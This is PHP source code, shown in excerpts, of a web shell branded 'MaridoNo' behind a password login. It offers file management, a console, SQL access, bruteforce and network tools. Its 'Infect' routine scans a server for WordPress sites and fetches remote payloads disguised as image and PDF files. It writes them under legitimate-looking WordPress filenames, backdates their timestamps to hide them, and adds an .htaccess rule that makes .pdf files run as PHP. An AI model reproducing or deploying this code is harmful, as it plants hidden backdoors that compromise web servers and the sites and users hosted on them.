...
function hardLogin() {
	...
	die("</br></br><center>
<form method=post style='MingLiU_HKSCS-ExtB;color:#ffffff; text-shadow: 2px 0 0 #205723, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #205723, 1px 1px #205723, -1px -1px 0 #205723, 1px -1px 0 #205723, -1px 1px 0 #205723; text-align: center;'>Tiga Serangkai Clans
<br><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='Pencet Mass' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#205723;color:#fff;cursor:pointer;'></form></pre>
<br><br><br>
...
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';
/* (С) 01.2022 dono */
function mari_get_contents($url) {
		    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')){
		        $mari_get_contents = file_get_contents($url);
		    }elseif(function_exists('fopen') && function_exists('stream_get_contents') && ini_get('allow_url_fopen')){
		        $handle = fopen ($url, "r");
		        $mari_get_contents = stream_get_contents($handle);      
		    }elseif(function_exists('curl_exec')){ 
		        $conn = curl_init($url);
		        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
		        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
		        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
		        $mari_get_contents = (curl_exec($conn));
		        curl_close($conn);    
		    }else{
		        $mari_get_contents = false;
		    }
		return $mari_get_contents;
} 
/* (С) 04.2015 Pirat */
function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['▜'];
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - MaridoNo " . VERSION ."</title>
    <link href='https://raw.githubusercontent.com/shariat1/dako-to-sahi/master/1st-bahunya-0.1.3.css' rel='stylesheet'>
    <link rel='stylesheet' href='https://raw.githubusercontent.com/shariat1/dako-to-sahi/master/2nd-bahunya-0.1.3.css'>
<style>
...
<input type=hidden name=charset>
	...
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"KcFinder\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	...
	$m = array('Sec. Info'=>'SecInfo','Files'=>'KcFinder','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
	if(!empty($GLOBALS['▛']))
	$m['Mass'] = 'Mass';
	$m['Logout'] = 'Logout';
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		<td><form onsubmit=\"".( function_exists('actionKcFinder')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td>
		...
		<td><form onsubmit=\"".( function_exists('actionKcFinder')? "g('KcFinder',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
		...
		<td><form method='post' ".( (!function_exists('actionKcFinder'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='KcFinder'>
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"KcFinder\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"KcFinder\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"KcFinder\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"KcFinder\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
	...
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'KcFinder\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
...
function actionInfect() {
	...
	echo '<h1>Infect</h1><div class=content>';
			...
			if (file_exists($direktori."/wp-config.php")) {
					echo '<br><br>';
					echo "<center><h3 style='color: green;'>WP: ".$direktori."</h3></center>";
				}
			echo '
				<br><br>
			...
			if ($_POST['tebar']) {
				...
				echo "<br><br><center><h3>Hajar miring ".$folderio."</h3></center>";

				$fullxx = $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], "", $direktori);

				

				$itemsxz = array("https://m.slotao.com/licenses.png", "https://m.slotao.com/mari.png", "https://m.slotao.com/marryme.psd", "https://m.slotao.com/harapan.gif", "https://m.slotao.com/class-wp-customize-nav-menu-customize.png", "https://m.slotao.com/Note.png", "https://raw.githubusercontent.com/dono-zz/1945/main/mari.png", "https://raw.githubusercontent.com/dono-zz/1945/main/new_year2022.jpg", "https://m.slotao.com/maridono.pdf", "https://m.slotao.com/supre.png", "https://m.slotao.com/opsi.txt");
				
				$items = array("login.php", "xmlrpc.php", "edit-form-advanced.php", "link-parse-opml.php", "ms-sites.php", "options-writing.php", "themes.php", "https.php", "class-https.php", "admin-ajax.php", "edit-form-comment.php", "link.php", "ms-themes.php", "mari.php", "plugin-editor.php", "admin-footer.php", "edit-link-form.php", "load-scripts.php", "ms-upgrade-network.php", "admin-functions.php", "edit.php", "load-styles.php", "ms-users.php", "plugins.php", "admin-header.php", "licenses.php", "edit-tag-form.php", "media-new.php", "my-sites.php", "apps.php", "post-new.php", "upgrade-themes.php", "sandwich.php", "edit-tags.php", "media.php", "nav-menus.php", "post.php", "admin-post.php", "maridono.php", "export.php", "Note.php", "media-upload.php", "network.php", "press-this.php", "upload.php", "async-upload.php", "menu-header.php", "options-discussion.php", "privacy.php", "user-edit.php", "menu.php", "options-general.php", "profile.php", "user-new.php", "moderation.php", "options-head.php", "revision.php", "users.php", "custom-background.php", "ms-admin.php", "options-media.php", "setup-config.php", "widgets.php", "theme-single.php", "custom-header.php", "ms-delete-site.php", "options-permalink.php", "term.php", "customize.php", "link-add.php", "supre.php", "ms-edit.php", "options.php", "edit-comments.php", "link-manager.php", "ms-options.php", "options-reading.php");

        		$resource1 = "https://m.slotao.com/licenses.png";
	                     ...
	                     if (is_writable($direktori)) {
							...
							$report9 = mari_get_contents($itemsxz[1]); file_put_contents($lapor9, $report9); 
							if (file_exists($lapor9)) {
								echo "<a href='//".$_SERVER['HTTP_HOST']."/.well-known/pki-validation/.../index.php''>".$_SERVER['HTTP_HOST']."/.well-known/pki-validation/.../index.php</a><br>";
								@touch/**/($lapor9, strtotime('-'.rand(30,90).' days', time()));	
							}
							
							if (!is_dir($direktori .'/-./')) { mkdir($direktori . '/-./', 0755, true); }	
							$lapor5	= $direktori.'/-./lapor.pdf';
							$report5 = mari_get_contents($$itemsxz[1]); file_put_contents($lapor5, $report5); 
							$htaccess = $direktori."/-./.htaccess";
						    $contentx = 'QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';
						    $contentx = base64_decode/*****/($contentx);
						    @file_put_contents($htaccess, $contentx);
						    if (file_exists($lapor5)) {
								echo "<a href='//".$_SERVER['HTTP_HOST']."/-./lapor.pdf''>".$_SERVER['HTTP_HOST']."/-./lapor.pdf</a><br>"; 
                ...
                if ($folderio) {
                    ...
                    if (file_exists($lapor8)) {
                        ...
                        $targetSitez = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
                        
                        $srcz = mari_get_contents($targetSitez);

                        preg_match("/.*stylesheet.*href=.*\/themes\/(.*?)\/.*\.css.*\>/i",$srcz,$matchesz);
                        $styleHrefz = trim($matchesz[1]);
                        if ($styleHrefz ) {
                        echo "<br><br><center>Themes Wordpress: <strong><h2>". $styleHrefz . "</h2></strong></center>";
                        } else { echo "<br><br><center>Themes Wordpress: <strong><h2>Website Error</h2></strong></center>"; }



                        $lapor1 = $folderio.'/.tmb/index.php';
                        $lapor2 = $folderio.'/wp-content/upgrade/mari.php';
                        ...
                        foreach (scandir($folderio) as $detailsfolderx) {
	                        ...
	                        if (is_dir($wpfolder) && $detailsfolderx != "." && $detailsfolderx != "..") {   
	                        	...
	                        	if (is_writable($wpfolder)) {
		                        	...
		                        	if ($detailsfolderx === "wp-content") {
				                        ...
				                        $report200 = mari_get_contents($itemsxz[2]); file_put_contents($lapor2, $report200); @touch($lapor2, strtotime('-'.rand(30,90).' days', time()));        
                        				$report300 = mari_get_contents($itemsxz[3]); file_put_contents($lapor3, $report300); @touch($lapor3, strtotime('-'.rand(30,90).' days', time())); 
                        				if (file_exists($lapor2)) {
                        					echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor2)."</a><br>";
                        				}
                        				if (file_exists($lapor3)) {
                        					echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."'>".$fullx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor3)."</a><br>";
                        				}
										...
										$report = mari_get_contents($itemsxz[$i]); file_put_contents($laporanz[$i], $report); @touch($laporanz[$i], strtotime('-'.rand(30,90).' days', time())); 
										...
										$key1 = $items[array_rand($items)];
                                        $laporanzx = $wpfolder.DIRECTORY_SEPARATOR.$key1;
                                     
                                        $sourcezx = $itemsxz[array_rand($itemsxz)];
                                        
                                        $reportx = mari_get_contents($sourcezx); file_put_contents($laporanzx, $reportx); @touch($laporanzx, strtotime('-'.rand(30,90).' days', time()));
                                        if (file_exists($laporanzx)) {
											echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanzx)."''>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $laporanzx)."</a><br>";
											
										}
									
									if (file_exists($wpfolder.'/.htaccess')) {
	                        ...
	                        echo "<br>Adminer :";
	                        if (file_exists($lapor11)) {
	                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor11)."'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor11)."</a><br>";
	                        }
                                ...
                                foreach (scandir($folderio) as $detailsfolder) {
                                    ...
                                    if(is_dir($nonwpfolder) and $detailsfolder != "." && $detailsfolder != "..") {                            
                                        ...
                                        if (is_writable($nonwpfolder)) {
                                            ...
                                            if (file_exists($nonwpfolder.'/.htaccess')) {
                                            ...
                                            if ($detailsfolder === 'docs') {
                                                ...
                                                $report1 = mari_get_contents($resource1); file_put_contents($lapor1, $report1); @touch/**/($lapor1, strtotime('-'.rand(30,90).' days', time()));
                                                if (file_exists($lapor1)) {
                                            ...
                                            if ($detailsfolder === 'public') {
                                                ...
                                                $report2 = mari_get_contents($resource1); file_put_contents($lapor2, $report2); @touch/***/($lapor2, strtotime('-'.rand(30,90).' days', time()));
                                                if (file_exists($lapor2)) {
                                                ...
                                                if (is_array($itemsxz) || is_object($itemsxz)) {
                                                        ...
                                                        $namafile = $items[array_rand($items)];  
                                                        $lapor3 = $nonwpfolder.DIRECTORY_SEPARATOR.$namafile;

		                                            for ($i=0; $i< count($itemsxz); $i++ ) {
																if(($i+1)<=7) {
		                                                        	$getcontentsource = $itemsxz[$i]; 
		                                                        	$report3 = mari_get_contents($getcontentsource); file_put_contents($lapor3, $report3); 
		                                                        } else { 
